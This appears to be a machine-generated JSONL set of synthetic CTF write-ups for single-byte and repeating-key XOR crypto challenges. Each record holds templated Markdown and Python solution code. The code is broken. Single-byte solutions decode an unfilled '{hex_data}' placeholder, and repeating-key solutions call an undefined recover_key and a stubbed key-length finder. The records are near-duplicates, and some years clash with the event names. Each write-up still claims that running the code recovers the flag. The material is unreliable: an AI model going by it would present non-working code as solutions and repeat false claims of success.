{"id": "synthetic_xor_051", "team": "synthetic_team_3", "event": "CTF_2024_Event_10", "challenge_name": "Single Byte XOR #52", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/51", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829912", "synthetic": true}
{"id": "synthetic_xor_052", "team": "synthetic_team_10", "event": "CTF_2024_Event_1", "challenge_name": "Single Byte XOR #53", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/52", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829947", "synthetic": true}
{"id": "synthetic_xor_053", "team": "synthetic_team_6", "event": "CTF_2024_Event_20", "challenge_name": "Multi-byte XOR Key Reuse #54", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"85a8ebf0d5b157340f25d888bcec01c210da5b7dd6fdfca70b4aa55944cb34ce\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"85a8ebf0d5b157340f25d888bcec01c210da5b7dd6fdfca70b4aa55944cb34ce\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/53", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.829978", "synthetic": true}
{"id": "synthetic_xor_054", "team": "synthetic_team_8", "event": "CTF_2024_Event_8", "challenge_name": "Single Byte XOR #55", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/54", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830009", "synthetic": true}
{"id": "synthetic_xor_055", "team": "synthetic_team_10", "event": "CTF_2024_Event_10", "challenge_name": "Single Byte XOR #56", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/55", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830042", "synthetic": true}
{"id": "synthetic_xor_056", "team": "synthetic_team_9", "event": "CTF_2024_Event_2", "challenge_name": "Multi-byte XOR Key Reuse #57", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"de074841b57a7c7c2844c268ec0412278f185d8ab940bf59608b65bd72712807\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"de074841b57a7c7c2844c268ec0412278f185d8ab940bf59608b65bd72712807\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/56", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830072", "synthetic": true}
{"id": "synthetic_xor_057", "team": "synthetic_team_4", "event": "CTF_2024_Event_7", "challenge_name": "Multi-byte XOR Key Reuse #58", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"bc3ce94540309720f802d99e828c1347fef7e47022ce4e93edfb27290d8c456d\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"bc3ce94540309720f802d99e828c1347fef7e47022ce4e93edfb27290d8c456d\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/57", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830104", "synthetic": true}
{"id": "synthetic_xor_058", "team": "synthetic_team_8", "event": "CTF_2024_Event_5", "challenge_name": "Single Byte XOR #59", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/58", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830137", "synthetic": true}
{"id": "synthetic_xor_059", "team": "synthetic_team_3", "event": "CTF_2024_Event_20", "challenge_name": "Single Byte XOR #60", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/59", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830172", "synthetic": true}
{"id": "synthetic_xor_060", "team": "synthetic_team_1", "event": "CTF_2024_Event_19", "challenge_name": "Single Byte XOR #61", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/60", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830203", "synthetic": true}
{"id": "synthetic_xor_061", "team": "synthetic_team_1", "event": "CTF_2024_Event_12", "challenge_name": "Single Byte XOR #62", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/61", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830233", "synthetic": true}
{"id": "synthetic_xor_062", "team": "synthetic_team_7", "event": "CTF_2024_Event_4", "challenge_name": "Multi-byte XOR Key Reuse #63", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"17ebb703fe315510bb3deb814a8c94df4cafbc17cbd05ca55043c246e0a87209\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"17ebb703fe315510bb3deb814a8c94df4cafbc17cbd05ca55043c246e0a87209\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/62", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830264", "synthetic": true}
{"id": "synthetic_xor_063", "team": "synthetic_team_6", "event": "CTF_2024_Event_15", "challenge_name": "Multi-byte XOR Key Reuse #64", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"2dbf3265d4e14fbc9a79f24e28b3e1d907495088515ee43fa4189f4ccf0f2073\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"2dbf3265d4e14fbc9a79f24e28b3e1d907495088515ee43fa4189f4ccf0f2073\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/63", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830295", "synthetic": true}
{"id": "synthetic_xor_064", "team": "synthetic_team_3", "event": "CTF_2024_Event_19", "challenge_name": "Single Byte XOR #65", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/64", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830327", "synthetic": true}
{"id": "synthetic_xor_065", "team": "synthetic_team_3", "event": "CTF_2024_Event_20", "challenge_name": "Single Byte XOR #66", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/65", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830357", "synthetic": true}
{"id": "synthetic_xor_066", "team": "synthetic_team_7", "event": "CTF_2024_Event_2", "challenge_name": "Single Byte XOR #67", "challenge_description": "XOR cipher with single byte key", "attack_type": "XOR", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Single Byte XOR\n\n## Challenge Description\nXOR cipher with single byte key\n\n## Analysis\nThis challenge involves single byte xor techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef single_byte_xor(data, key):\n    return bytes([b ^ key for b in data])\n\n# Brute force all possible keys\nencrypted = bytes.fromhex(\"{hex_data}\")\n\nfor key in range(256):\n    decrypted = single_byte_xor(encrypted, key)\n    try:\n        text = decrypted.decode('ascii')\n        if 'flag{' in text.lower():\n            print(f\"Key: {key}\")\n            print(f\"Flag: {text}\")\n            break\n    except:\n        continue\n", "url": "https://synthetic-ctf.example.com/xor/66", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830387", "synthetic": true}
{"id": "synthetic_xor_067", "team": "synthetic_team_5", "event": "CTF_2024_Event_2", "challenge_name": "Multi-byte XOR Key Reuse #68", "challenge_description": "XOR with repeating key, vulnerable to frequency analysis", "attack_type": "XOR", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Multi-byte XOR Key Reuse\n\n## Challenge Description\nXOR with repeating key, vulnerable to frequency analysis\n\n## Analysis\nThis challenge involves multi-byte xor key reuse techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"44e8d6912aeb72b25ab7ab24d69db8b7169f43009c09ab532a0d53fcd872fabb\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef xor_decrypt(data, key):\n    result = []\n    for i, byte in enumerate(data):\n        result.append(byte ^ key[i % len(key)])\n    return bytes(result)\n\ndef find_key_length(ciphertext):\n    # Kasiski examination or index of coincidence\n    for key_len in range(2, 20):\n        blocks = [ciphertext[i::key_len] for i in range(key_len)]\n        # Analyze frequency patterns\n        # ... implementation details\n    return key_len\n\n# Key recovery and decryption\nencrypted = bytes.fromhex(\"44e8d6912aeb72b25ab7ab24d69db8b7169f43009c09ab532a0d53fcd872fabb\")\nkey_length = find_key_length(encrypted)\nkey = recover_key(encrypted, key_length)\nflag = xor_decrypt(encrypted, key)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/xor/67", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.830418", "synthetic": true}
